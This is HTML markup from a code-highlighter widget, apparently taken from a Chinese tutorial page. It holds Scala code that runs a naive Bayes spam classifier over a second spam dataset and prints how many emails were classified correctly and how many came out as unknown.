			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
val listOfSpam2Files =   getFilesFromDir(spam2Path)
val spam2Mails = listOfSpam2Files
    .map{x =&amp;gt; (x,getMessage(x)) }

val spam2FeatureVectors = spam2Mails
    .map(x =&amp;gt; bag.feature(x._2.split(&quot; &quot;)))

val spam2ClassificationResults = spam2FeatureVectors
    .map(x =&amp;gt; bayes.predict(x))

//Correct classifications are those who resulted in a spam classification (0)
//正确的分类是那些分出垃圾邮件（0）的结果
val correctClassifications = spam2ClassificationResults
    .count( x=&amp;gt; x == 0)

println (   correctClassifications + 
            &quot; of &quot; + 
            listOfSpam2Files.length + 
            &quot;were correctly classified&quot;
        )

println ((  (correctClassifications.toDouble / 
             listOfSpam2Files.length) * 100)  +
              &quot;% was correctly classified&quot;
        )

//In case the algorithm could not decide which category the email 
//belongs to, it gives a -1 (unknown) rather than a 0 (spam) or 1 (ham)
//如果算法无法确定一封邮件属于哪一类，
//它会给出-1（未知的）的结果而不是0（垃圾邮件）或1（正常邮件）

val unknownClassifications = spam2ClassificationResults
    .count( x=&amp;gt; x == -1)

println(    unknownClassifications + 
            &quot; of &quot; + 
            listOfSpam2Files.length +
            &quot;were unknowingly classified&quot;
        )

println(    (   (unknownClassifications.toDouble / 
                listOfSpam2Files.length) * 100)  +
                % was unknowingly classified&quot;
        )&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061359600913915-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061359600913915-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061359600913915-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061359600913915-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061359600913915-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061359600913915-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061359600913915-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061359600913915-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061359600913915-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061359600913915-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061359600913915-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061359600913915-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061359600913915-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061359600913915-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061359600913915-15&quot;&gt;15&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061359600913915-16&quot;&gt;16&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061359600913915-17&quot;&gt;17&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061359600913915-18&quot;&gt;18&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061359600913915-19&quot;&gt;19&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061359600913915-20&quot;&gt;20&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061359600913915-21&quot;&gt;21&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061359600913915-22&quot;&gt;22&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061359600913915-23&quot;&gt;23&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061359600913915-24&quot;&gt;24&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061359600913915-25&quot;&gt;25&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061359600913915-26&quot;&gt;26&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061359600913915-27&quot;&gt;27&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061359600913915-28&quot;&gt;28&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061359600913915-29&quot;&gt;29&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061359600913915-30&quot;&gt;30&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061359600913915-31&quot;&gt;31&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061359600913915-32&quot;&gt;32&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061359600913915-33&quot;&gt;33&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061359600913915-34&quot;&gt;34&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061359600913915-35&quot;&gt;35&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061359600913915-36&quot;&gt;36&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061359600913915-37&quot;&gt;37&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061359600913915-38&quot;&gt;38&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061359600913915-39&quot;&gt;39&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061359600913915-40&quot;&gt;40&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061359600913915-41&quot;&gt;41&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061359600913915-42&quot;&gt;42&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061359600913915-43&quot;&gt;43&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061359600913915-44&quot;&gt;44&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061359600913915-1&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;listOfSpam2Files&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;   &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getFilesFromDir&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;spam2Path&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061359600913915-2&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;spam2Mails&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;listOfSpam2Files&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061359600913915-3&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getMessage&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061359600913915-4&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061359600913915-5&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;spam2FeatureVectors&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;spam2Mails&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061359600913915-6&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;bag&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;feature&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot; &quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061359600913915-7&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061359600913915-8&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;spam2ClassificationResults&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;spam2FeatureVectors&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061359600913915-9&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;bayes&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;predict&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061359600913915-10&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061359600913915-11&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Correct classifications are those who resulted in a spam classification (0)&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061359600913915-12&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;//正确的分类是那些分出垃圾邮件（0）的结果&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061359600913915-13&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;correctClassifications&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;spam2ClassificationResults&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061359600913915-14&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061359600913915-15&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061359600913915-16&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;   &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;correctClassifications&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061359600913915-17&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;            &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot; of &quot;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061359600913915-18&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;            &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;listOfSpam2Files&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061359600913915-19&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;            &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;were correctly classified&quot;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061359600913915-20&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061359600913915-21&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061359600913915-22&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;correctClassifications&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;toDouble&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061359600913915-23&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;             &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;listOfSpam2Files&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061359600913915-24&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;              &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;% was correctly classified&quot;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061359600913915-25&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061359600913915-26&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061359600913915-27&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;//In case the algorithm could not decide which category the email &lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061359600913915-28&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;//belongs to, it gives a -1 (unknown) rather than a 0 (spam) or 1 (ham)&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061359600913915-29&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;//如果算法无法确定一封邮件属于哪一类，&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061359600913915-30&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;//它会给出-1（未知的）的结果而不是0（垃圾邮件）或1（正常邮件）&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061359600913915-31&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061359600913915-32&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;unknownClassifications&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;spam2ClassificationResults&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061359600913915-33&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061359600913915-34&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061359600913915-35&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;unknownClassifications&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061359600913915-36&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;            &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot; of &quot;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061359600913915-37&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;            &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;listOfSpam2Files&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061359600913915-38&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;            &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;were unknowingly classified&quot;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061359600913915-39&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
